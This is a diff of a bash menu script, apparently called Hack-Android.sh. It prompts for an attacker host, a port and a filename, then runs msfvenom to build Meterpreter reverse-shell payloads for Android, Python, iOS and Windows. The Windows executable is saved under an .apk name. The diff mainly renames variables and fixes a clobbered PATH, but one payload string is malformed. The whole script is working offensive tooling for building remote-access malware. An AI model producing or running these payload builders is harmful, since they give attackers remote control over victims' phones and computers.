@@ -99,54 +99,54 @@ echo -e $white "insert the number "
 read -p "insert :>" payload
 if [ $payload = 1 ]
 then 
-echo -e $red " please insert LHOST "
-read -p "insert LHOST" LHOST
-echo -e $red " please insert port "
-read -p "insert port" PORT
-echo -e $red " please insert Name payload "
+echo -e $red " please insert LHOST :>"
+read -p "insert LHOST" lhost
+echo -e $red " please insert port :>"
+read -p "insert port" lport
+echo -e $red " please insert Name payload :>"
 read -p "insert name" name
-echo -e $red " please insert path "
-read -p "insert PATH" PATH
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $PATH/$name.apk
+echo -e $red " please insert path :>"
+read -p "insert PATH" path
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $path/$name.apk
 bash Hack-Android.sh
 fi
 if [ $payload = 2 ]
 then 
-echo -e $red " please insert LHOST "
-read -p "insert LHOST" LHOST
-echo -e $red " please insert port "
-read -p "insert port" PORT
-echo -e $red " please insert Name payload "
+echo -e $red " please insert LHOST :>"
+read -p "insert LHOST" lhost
+echo -e $red " please insert port :>"
+read -p "insert port" lport
+echo -e $red " please insert Name payload :>"
 read -p "insert name" name
-echo -e $red " please insert path "
-read -p "insert PATH" PATH
-msfvenom -f raw -p python/meterpreter/reverse_tcp/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $PATH/$name.py
+echo -e $red " please insert path :>"
+read -p "insert PATH" path
+msfvenom -f raw -p python/meterpreter/reverse_tcp/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $path/$name.py
 bash Hack-Android.sh
 fi
 if [ $payload = 3 ]
 then 
-echo -e $red " please insert LHOST "
-read -p "insert LHOST" LHOST
-echo -e $red " please insert port "
-read -p "insert port" PORT
-echo -e $red " please insert Name payload "
+echo -e $red " please insert LHOST :>"
+read -p "insert LHOST" lhost
+echo -e $red " please insert port :>"
+read -p "insert port" lport
+echo -e $red " please insert Name payload :>"
 read -p "insert name" name
-echo -e $red " please insert path "
-read -p "insert PATH" PATH
-msfvenom -p apple_ios/aarch64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $PATH/$name.api
+echo -e $red " please insert path :>"
+read -p "insert PATH" path
+msfvenom -p apple_ios/aarch64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $path/$name.api
 bash Hack-Android.sh
 fi
 if [ $payload = 4 ]
 then 
-echo -e $red " please insert LHOST "
-read -p "insert LHOST" LHOST
-echo -e $red " please insert port "
-read -p "insert port" PORT
-echo -e $red " please insert Name payload "
+echo -e $red " please insert LHOST :>"
+read -p "insert LHOST" lhost
+echo -e $red " please insert port :>"
+read -p "insert port" lport
+echo -e $red " please insert Name payload :>"
 read -p "insert name" name
-echo -e $red " please insert path "
-read -p "insert PATH" PATH
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o $PATH/$name.apk
+echo -e $red " please insert path :>"
+read -p "insert PATH" path
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o $path/$name.apk
 bash Hack-Android.sh
 fi
 if [ $payload = 00 ]
